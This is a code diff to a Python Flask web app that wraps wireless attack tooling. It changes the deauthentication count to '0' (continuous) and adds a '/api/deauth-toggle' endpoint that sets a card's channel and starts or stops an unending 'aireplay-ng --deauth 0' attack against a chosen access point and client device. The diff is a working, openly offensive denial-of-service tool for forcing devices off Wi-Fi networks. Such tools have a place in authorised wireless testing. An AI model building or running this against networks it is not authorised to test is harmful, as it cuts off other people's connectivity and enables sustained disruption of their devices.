@@ -3,7 +3,7 @@ import subprocess
 from scanner import scan_wifi
 
 TIME = 30
-DEAUTH = "10"
+DEAUTH = "0"
 
 app = Flask(__name__, static_url_path='/static')
 
@@ -24,7 +24,7 @@ def deauth():
     station = data.get("station")
     channel = data.get("channel")
     iface = data.get("iface", "wlan0")
-    print(channel)
+    #print(channel)
     
     if not bssid or not station:
         return jsonify({"error": "Missing parameters"}), 400
@@ -38,6 +38,43 @@ def deauth():
         return jsonify({"message": f"Deauth sent to {station} via {iface}"})
     except Exception as e:
         return jsonify({"error": str(e)}), 500
+    
+from flask import request
+import subprocess
+
+active_deauth_processes = {}
+
+@app.route("/api/deauth-toggle", methods=["POST"])
+def deauth_toggle():
+    data = request.get_json()
+    bssid = data.get("bssid")
+    station = data.get("station")
+    iface = data.get("iface")
+    channel = data.get("channel")
+    active = data.get("active")
+
+    key = f"{bssid}_{station}_{iface}"
+
+    try:
+        # Set channel first
+        subprocess.run(["iwconfig", iface, "channel", str(channel)], check=True)
+
+        if active:
+            # Launch continuous deauth (aireplay-ng --deauth 0)
+            proc = subprocess.Popen(
+                ["aireplay-ng", "--deauth", "0", "-a", bssid, "-c", station, iface],
+            )
+            active_deauth_processes[key] = proc
+            return jsonify({"message": f"Started deauth on {station}"})
+        else:
+            proc = active_deauth_processes.get(key)
+            if proc:
+                proc.terminate()
+                del active_deauth_processes[key]
+            return jsonify({"message": f"Stopped deauth on {station}"})
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
 
 @app.route("/api/interfaces")
 def list_wifi_interfaces():
